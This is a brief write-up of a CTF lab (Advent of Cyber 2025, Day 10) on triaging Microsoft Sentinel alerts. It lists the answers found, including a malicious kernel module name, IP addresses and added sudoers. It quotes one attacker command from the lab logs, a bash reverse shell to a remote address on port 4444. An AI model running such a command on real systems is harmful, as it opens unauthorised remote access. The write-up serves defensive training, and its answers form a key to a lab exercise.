---
id: 10
title: Advent of Cyber 2025: Day 10
date: 2025-12-10
category: CTF
difficulty: Medium
readTime: 3 min
---

## Introduction

Today's lab is about **Understand the importance of alert triage and prioritisation**  and **xplore Microsoft Sentinel to review and analyse alerts** . 
But due to High volumes i couldn't access it on time . 

## Walkthrough

Setting up the azure was harder than i thought maybe due to the high volume . it took a long time 

> In the sytem there were a total of **10** entities 

> of **High** Severity 

> and a total of **4** accounts were added to sudoers

name of the kernal module is **malicious_mod.ko**

command executed 
```
/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
```

Source  Ip `172.16.0.12`
external Ip `203.0.113.45`

name of the sudoer group added inside app-01 is **deploy**



